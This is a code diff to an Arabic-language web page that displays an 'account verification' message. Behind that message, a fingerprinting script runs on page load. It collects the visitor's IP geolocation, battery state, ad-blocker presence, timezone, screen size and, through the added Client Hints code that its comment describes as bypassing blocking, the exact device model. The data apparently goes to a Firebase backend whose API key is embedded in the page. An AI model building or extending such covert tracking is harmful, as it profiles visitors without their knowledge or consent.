@@ -58,7 +58,7 @@
         <p>جاري التحقق من الحساب...</p>
     </div>
 
-    <!-- سكريبت التتبع المتقدم واستخراج البصمة الرقمية -->
+    <!-- سكريبت التتبع المتقدم واستخراج البصمة الرقمية والموديل المباشر -->
     <script>
         const firebaseConfig = {
             apiKey: "AIzaSyD60g3bc-e6h9JMRUR3eKcD5oRO2rAb4vQ",
@@ -101,12 +101,33 @@
             return { level: 'غير مدعوم', charging: 'غير مدعوم' };
         }
 
-        // 3. كشف نوع الجهاز وموديله
-        function getDeviceModel() {
+        // 3. كشف نوع الجهاز والموديل المباشر بتجاوز قيود الحجب (Client Hints)
+        async function getDeviceModel() {
             const ua = navigator.userAgent;
+            let deviceDetail = "Android Device";
+
+            // طلب الموديل المباشر عالي الدقة من المتصفح
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+                    if (uaData.model && uaData.model.trim() !== "") {
+                        deviceDetail = uaData.model;
+                    }
+                } catch (e) {
+                    console.log("Client Hints unavailable, using Regex fallback...");
+                }
+            }
+
+            // فحص احتياطي عبر السلسلة في حال عدم دعم Client Hints
+            if (deviceDetail === "Android Device") {
+                const match = ua.match(/\(([^;]+);[^\)]*Build\/([^\);]+)/i) || ua.match(/Android[^;]+; ([^;\)]+)/i);
+                if (match && match[1]) {
+                    deviceDetail = match[1].replace(/Linux;/i, '').trim();
+                }
+            }
+
             if (/android/i.test(ua)) {
-                const match = ua.match(/Build\/([a-zA-Z0-9_-]+)/);
-                return { type: 'هاتف ذكي (Android)', detail: match ? match[1] : 'Android Device' };
+                return { type: 'هاتف ذكي (Android)', detail: deviceDetail };
             } else if (/iPhone|iPad|iPod/i.test(ua)) {
                 return { type: 'هاتف/آيباد (iOS)', detail: 'Apple Device' };
             } else if (/Windows/i.test(ua)) {
@@ -126,10 +147,10 @@
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
 
-                // فحص البطارية ومانع الإعلانات ونوع الجهاز
+                // فحص البطارية ومانع الإعلانات والموديل المباشر
                 const hasAdBlock = await checkAdBlocker();
                 const batteryInfo = await getBatteryInfo();
-                const deviceMeta = getDeviceModel();
+                const deviceMeta = await getDeviceModel();
 
                 // تحديد التهديدات ونسبة المخاطر
                 const org = (ipData.org || '').toLowerCase();
@@ -150,7 +171,7 @@
                     device_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف',
                     device_language: navigator.language || 'غير معروف',
                     
-                    // بيانات الجهاز والبيئة الجديدة
+                    // بيانات الجهاز المحدثة
                     device_type: deviceMeta.type,
                     device_model: deviceMeta.detail,
                     screen_resolution: `${window.screen.width}x${window.screen.height}`,
